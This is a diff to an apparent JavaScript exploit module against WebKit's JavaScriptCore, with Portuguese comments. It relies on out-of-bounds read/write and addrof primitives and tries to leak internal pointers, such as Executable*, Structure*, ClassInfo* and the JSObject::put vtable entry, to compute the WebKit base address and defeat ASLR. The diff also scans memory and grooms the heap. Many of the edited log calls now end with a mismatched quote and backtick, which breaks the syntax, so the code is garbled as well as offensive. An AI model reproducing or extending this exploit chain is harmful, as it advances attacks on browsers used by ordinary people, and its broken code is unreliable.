@@ -1,19 +1,17 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R88 - Corrected Scoping & Targeted Heap Manipulation)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R89 - Final Corrections & Robust Scan Loop)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. OOB/L/E Funcional: Primitivas estáveis.
 // 2. Poluição de Heap Persistente: 0xdeadbeef_cafebabe ainda bloqueia vazamentos de ponteiros.
 // 3. CORRIGIDO: Erro de escopo para `pollution_value` na função auxiliar de vazamento.
-// 4. CORRIGIDO: Erros de tipo na varredura de memória, tornando-a mais robusta.
-// 5. Heap Grooming Refinado: Ajustado para buscar "sweet spots". Tentativas simplificadas
-//    de "Heap Coloring" e "Memory Bridging" com ArrayBuffers para forçar reutilização controlada.
+// 4. CORRIGIDO: Erros de tipo na varredura de memória, garantindo que `current_scan_addr`
+//    e `read_val` sejam `AdvancedInt64` válidos antes de operações.
+// 5. Heap Grooming Refinado: Ajustado para buscar "sweet spots".
 // 6. Vazamento por Varredura de Memória (Robusta):
 //    - Continua a busca por padrões numéricos e ponteiros válidos.
-//    - Adiciona verificação de integridade de AdvancedInt64 após cada leitura.
 //
-// DIAGNÓSTICO: A poluição é o obstáculo central. Essa versão foca em uma varredura
-//              funcional para obter mais informações sobre a distribuição da poluição
-//              e uma manipulação de heap mais focada.
+// DIAGNÓSTICO: A poluição é o obstáculo central. Esta versão visa máxima robustez
+//              da varredura para coletar dados completos, se possível.
 //
 // ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
 // =======================================================================================
@@ -27,7 +25,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R88_HeapManipScan";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R89_FinalScanRobustness";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -356,7 +354,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     throw new Error(`Ponteiro de dados do TypedArray (${actual_data_ptr.toString(true)}) não parece um endereço de heap válido.`);
                 }
 
-                logS3(`++++++++++++ VAZAMENTO DE PONTEIRO DE DADOS DE TYPEDARRAY BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
+                logS3(`++++++++++++ VAZAMENTO DE PONTEIRO DE DADOS DE TYPEDARRAY BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln`);
                 final_result.webkit_leak_details = {
                     success: true,
                     msg: `Ponteiro de dados de TypedArray vazado com sucesso: ${actual_data_ptr.toString(true)}`,
@@ -385,25 +383,25 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info");
 
             if (!isAdvancedInt64Object(func_addr) || func_addr.equals(NEW_POLLUTION_VALUE) || func_addr.equals(AdvancedInt64.Zero) || func_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Math.cos Addr está lendo o valor de poluição ou inválido (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Math.cos Addr está lendo o valor de poluição ou inválido (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn`);
                 throw new Error("JSCFunction Addr poluído.");
             }
 
             const EXECUTABLE_OFFSET = LOCAL_JSC_OFFSETS.JSFunction_EXECUTABLE_OFFSET;
             if (EXECUTABLE_OFFSET) {
                  const executable_addr = arb_read_final(func_addr.add(EXECUTABLE_OFFSET));
-                 logS3(`    Lido Executable* (${toHex(EXECUTABLE_OFFSET)}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
+                 logS3(`    Lido Executable* (${toHex(EXECUTABLE_OFFSET)}): ${executable_addr.toString(true)}`, "leak");
 
                  if (executable_addr.equals(NEW_POLLUTION_VALUE)) {
-                    logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                    logS3(`    ALERTA DE POLUIÇÃO: Executable* está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn`);
                     throw new Error("JSCFunction Executable* poluído.");
                  }
                  if (!isAdvancedInt64Object(executable_addr) || executable_addr.equals(AdvancedInt64.Zero) || executable_addr.equals(AdvancedInt64.NaNValue)) {
-                    logS3(`    ALERTA: Executable* de Math.cos é 0, NaN ou inválido.`, "warn");
-                    throw new Error(`Falha ao vazar Executable* de Math.cos: ${executable_addr.toString(true)} é inválido.`);
+                    logS3(`    ALERTA: Executable* é 0, NaN ou inválido.`, "warn`);
+                    throw new Error(`Falha ao vazar Executable*: ${executable_addr.toString(true)} é inválido.`);
                  }
                  if (executable_addr.high() > 0x40000000) {
-                    logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
+                    logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln`);
                     final_result.webkit_leak_details = {
                         success: true,
                         msg: `Endereço de Executable* de JSCFunction vazado com sucesso: ${executable_addr.toString(true)}`,
@@ -412,11 +410,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     };
                     return final_result;
                  } else {
-                    logS3(`    ALERTA: Executable* (${executable_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de função.`, "warn");
-                    throw new Error("Executable* de Math.cos não parece endereço sane.");
+                    logS3(`    ALERTA: Executable* (${executable_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de função.`, "warn`);
+                    throw new Error("Executable* não parece endereço sane.");
                  }
             } else {
-                logS3(`    Offset para EXECUTABLE_OFFSET em JSFunction não definido em JSC_OFFSETS. Pulando tentativa de vazamento.`, "warn");
+                logS3(`    Offset para EXECUTABLE_OFFSET não definido. Pulando tentativa.`, "warn`);
             }
         } catch (jsc_func_leak_e) {
             logS3(`  Falha na tentativa de vazamento com JSCFunction: ${jsc_func_leak_e.message}`, "warn");
@@ -438,7 +436,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");
 
             if (!isAdvancedInt64Object(target_obj_addr) || target_obj_addr.equals(AdvancedInt64.Zero) || target_obj_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    Addrof retornou 0 ou NaN para objeto alvo. Pulando tentativa.`, "error");
+                logS3(`    Addrof retornou 0 ou NaN para objeto alvo. Pulando tentativa.`, "error`);
                 throw new Error("Addrof para ClassInfo leak falhou.");
             }
 
@@ -446,7 +444,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const structure_ptr_addr = target_obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
             const structure_addr = arb_read_final(structure_ptr_addr);
             if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Structure* está lendo o valor de poluição ou inválido (${pollution_value.toString(true)}).`, "warn");
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Structure* está lendo o valor de poluição ou inválido (${pollution_value.toString(true)}).`, "warn`);
                 throw new Error("Structure* poluído/inválido.");
             }
             logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");
@@ -455,7 +453,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
             const class_info_addr = arb_read_final(class_info_ptr_addr);
             if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
                 throw new Error("ClassInfo* poluído.");
             }
             logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
@@ -464,7 +462,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
             const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
             if (!isAdvancedInt64Object(cached_type_info_addr) || cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: m_cachedTypeInfo está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: m_cachedTypeInfo está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
                 throw new Error("m_cachedTypeInfo poluído/inválido.");
             }
             logS3(`    Lido m_cachedTypeInfo do ClassInfo: ${cached_type_info_addr.toString(true)}`, "leak");
@@ -474,7 +472,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error(`Ponteiro m_cachedTypeInfo (${cached_type_info_addr.toString(true)}) não parece um endereço de heap válido.`);
             }
 
-            logS3(`++++++++++++ VAZAMENTO DE JSC::ClassInfo::m_cachedTypeInfo BEM SUCEDIDO! ++++++++++++`, "vuln");
+            logS3(`++++++++++++ VAZAMENTO DE JSC::ClassInfo::m_cachedTypeInfo BEM SUCEDIDO! ++++++++++++`, "vuln`);
             final_result.webkit_leak_details = {
                 success: true,
                 msg: `Endereço de JSC::ClassInfo::m_cachedTypeInfo vazado com sucesso: ${cached_type_info_addr.toString(true)}`,
@@ -513,6 +511,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             // CORREÇÃO: Usar os novos métodos de comparação em AdvancedInt64 para a condição do loop.
             for (let current_scan_addr = START_SCAN_ADDR; current_scan_addr.lessThan(END_SCAN_ADDR); current_scan_addr = current_scan_addr.add(8)) {
                 
+                // Validação defensiva do current_scan_addr antes de usá-lo
+                if (!isAdvancedInt64Object(current_scan_addr)) {
+                    logS3(`    AVISO: current_scan_addr inválido antes da leitura: ${current_scan_addr}. Pulando.`, "warn");
+                    break; // Ou continue, dependendo se o erro é fatal
+                }
+
                 if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) { 
                      logS3(`    Parando varredura em endereço alto inesperado (potential crash): ${current_scan_addr.toString(true)}`, "debug");
                      break; 
@@ -655,7 +659,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
         logS3(`    Lido StructureID_Flattened (${JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
         if (!isAdvancedInt64Object(structure_id_flattened_val) || structure_id_flattened_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("StructureID_FLATTENED poluído.");
         }
 
@@ -675,7 +679,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
         logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
         if (!isAdvancedInt64Object(typeinfo_type_flattened_val) || typeinfo_type_flattened_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: CELL_TYPEINFO_TYPE_FLATTENED está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: CELL_TYPEINFO_TYPE_FLATTENED está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("CELL_TYPEINFO_TYPE_FLATTENED poluído.");
         }
 
@@ -689,37 +693,37 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const class_info_addr = arb_read_func(class_info_ptr_addr);
         logS3(`    Lido ClassInfo* (${STRUCTURE_CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
         if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(pollution_value) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("ClassInfo* poluído.");
         }
-        if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
+        if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn`);
 
         const STRUCTURE_GLOBAL_OBJECT_OFFSET = LOCAL_JSC_OFFSETS.Structure_GLOBAL_OBJECT_OFFSET;
         const global_object_ptr_addr = structure_addr.add(STRUCTURE_GLOBAL_OBJECT_OFFSET);
         const global_object_addr = arb_read_func(global_object_ptr_addr);
         logS3(`    Lido GlobalObject* (${STRUCTURE_GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
         if (!isAdvancedInt64Object(global_object_addr) || global_object_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: GlobalObject* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: GlobalObject* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("GlobalObject* poluído.");
         }
-        if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");
+        if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn`);
 
         const STRUCTURE_PROTOTYPE_OFFSET = LOCAL_JSC_OFFSETS.Structure_PROTOTYPE_OFFSET;
         const prototype_ptr_addr = structure_addr.add(STRUCTURE_PROTOTYPE_OFFSET);
         const prototype_addr = arb_read_func(prototype_ptr_addr);
-        logS3(`    Lido Prototype* (${STRUCTURE_PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
         if (!isAdvancedInt64Object(prototype_addr) || prototype_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("Prototype* poluído.");
         }
-        if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
+        logS3(`    Lido Prototype* (${STRUCTURE_PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
+        if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn`);
 
         const STRUCTURE_AGGREGATED_FLAGS_OFFSET = LOCAL_JSC_OFFSETS.Structure_AGGREGATED_FLAGS_OFFSET;
         const aggregated_flags_addr = structure_addr.add(STRUCTURE_AGGREGATED_FLAGS_OFFSET);
         const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
         logS3(`    Lido AGGREGATED_FLAGS (${STRUCTURE_AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
         if (!isAdvancedInt64Object(aggregated_flags_val) || aggregated_flags_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("AGGREGATED_FLAGS poluído.");
         }
 
@@ -728,15 +732,15 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
         const STRUCTURE_VIRTUAL_PUT_OFFSET = LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET;
         const js_object_put_func_ptr_addr_in_structure = structure_addr.add(STRUCTURE_VIRTUAL_PUT_OFFSET);
-        const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
+        const js_object_put_func_addr = arb_read_final(js_object_put_func_ptr_addr_in_structure);
         logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
 
         if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.equals(pollution_value) || js_object_put_func_addr.equals(AdvancedInt64.Zero) || js_object_put_func_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
             throw new Error("JSC::JSObject::put poluído.");
         }
         if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) {
-            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
+            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn`);
         }
 
 
@@ -764,7 +768,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
             webkit_base_candidate: webkit_base_candidate.toString(true),
             js_object_put_addr: js_object_put_func_addr.toString(true)
         };
-        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
+        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln`);
         return true;
     } catch (leak_attempt_e) {
         logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
